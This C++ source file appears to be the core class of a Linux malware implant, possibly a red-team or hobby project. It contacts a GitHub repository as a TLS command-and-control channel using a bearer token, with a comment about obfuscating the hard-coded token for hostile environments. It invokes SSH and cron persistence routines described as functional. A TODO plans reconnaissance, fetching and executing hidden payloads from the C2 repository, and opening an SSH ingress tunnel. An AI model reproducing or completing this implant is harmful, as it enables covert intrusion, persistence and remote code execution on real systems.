// the application core class

#define CPPHTTPLIB_OPENSSL_SUPPORT

#include "grab_read_access_token.h"
#include "core.h"
#include <sstream>
#include <iostream>
#include <string>
#include "cpp-httplib/httplib.h"
#include <nlohmann/json.hpp>
#include <base64.hpp>
#include "clean-encoding.h"
#include <vector>
#include "ssh_persistence.h"
#include "extra_persistence_routines.h"

Core::Core() {
    std::cout << "[+] Application core initialized" << '\n';
    try {
        contact_server();
        establish_persistence();                                     // after this call, file_system_locations will be populated with the locations the file has been copied to;
        loop();
    } catch (const std::exception & e) {
        std::cout << "[!] Core::Core raised a standard exception" << e.what() << '\n';
    } catch (...) {
        std::cout << "[!] Core::Core raised an unknown error" << '\n';
    }
}

void Core::loop() {
    /* TODO
     * at this point, the implant has established C2 communication (over TLS), and the initial persistence routines have run;
     *
     * 1. conditional: if established_persistence_count < 1: scheduled_job_persistence()
     *      - scheduled_job_persistence() should establish persistence via systemd timer
     * 2. establish a loop to reach back out to the C2 channel once every 24 hours at a random interval throughout the day:
     *      - confirm contact
     *      - decode and read instruction       -> instruction should be of the form: COMMAND : file_to_stage
     *      - support instructions:
     *              - light_reconnaissance      -> grab current userid, username, kernel and OS versions, network interfaces, and recent user activity
     *                                          -> recent user activity: 
     *                                              - most recent 10 logons: "last | head -n 10"
     *                                              - processes of current logons: "w"
     *                                              - current logons: who
     *              - heavy_reconnaissance      -> grab running processes, user cronjobs, suid files, capabilities, world readable configs, list world readable home folders
     *              - run_file : file.type      -> grab the indicated file off of the C2 GH, write it to a hidden file, render it executable, and start it as a process
     *              - open_ingress_tunnel       -> open an ssh-tunnel based ingress channel into the local network
     *      
    */
    
}
                                            // The TLS encryption of this request has been confirmed with Wireshark
                                            // consult for further changes: https://github.com/yhirose/cpp-httplib
void Core::contact_server() {
    try {

        std::string auth_token = grab_read_access_token();          // returns "FAILED_NO_TOKEN" upon failure;
                                                                    // PAT.txt won't exist in a hostile environment, so hard code the access token with constexpr compile time obfuscation

        std::ostringstream header_formatted_token_string;           // creating the formatted bearer token needed for the request
        header_formatted_token_string << "token ";
        header_formatted_token_string << auth_token;

        // string that works: token {access_token}
        httplib::Headers headers = {
            { "User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0" },
            { "Authorization", header_formatted_token_string.str() }
        };

        httplib::Client client("https://api.github.com");

        client.enable_server_certificate_verification(true);

        std::cout << "[+] About to make the request" << '\n';

        auto response = client.Get("/repos/Carnelian-Security/authentication-testing/contents/test.txt", headers);

        std::cout << "[+] The request has been made" << '\n';

        if (response && response->status == 200) {
            std::cout << "[+] HTTP status code: " << response->status << '\n';

            nlohmann::json_abi_v3_11_3::json parsed_string = nlohmann::json::parse(response->body);

            std::string encoded_string = parsed_string["content"];

            std::string decoded_string = base64::from_base64(base64_remove_newlines(encoded_string));

            //std::cout << "[+] Decoded string: " << base64::from_base64(base64_remove_newlines(encoded_string)) << '\n';         // it is imperative to clean newlines before decoding!
            std::cout << "[+] Decoded string: " << decoded_string;         // it is imperative to clean newlines before decoding!

            std::string test_string = "contact has been established.";

            decoded_string.pop_back();

            if (decoded_string == test_string) {
                std::cout << "[+] Contact has successfully been established." << '\n';
            } else {
                std::cout << "[!] There is a difference between the 2 messages." << '\n';
                exit(EXIT_FAILURE);
            }

        } else if (response && response->status != 200) {
            std::cout << "[!] Request went through but the response code is not 200" << '\n';
        } else {
            std::cerr << "[!] The request failed: " << response.error() << '\n';
        }
    }
    catch (const std::exception & e) {
        std::cerr << "[!] A Standard exception occurred: " << e.what() << '\n';
    } catch (...) {
        std::cout << "[!] An unknown error occurred and was caught by (...)";
    }
}

void Core::establish_persistence() {
    std::cout << "[+] establish_persistence() routine initialized." << '\n' << "[+] Attempting to establish SSH and Cron based persistence" << '\n';

    // if (establish_ssh_persistence() == true) {established_persistence_count++;}                       // true if persistence is established, false otherwise
    // if (establish_crontab_persistence() == true) {established_persistence_count++;}
    //      ^^^^^ both persistence routines are functional; the code should be reviewed again before use

}
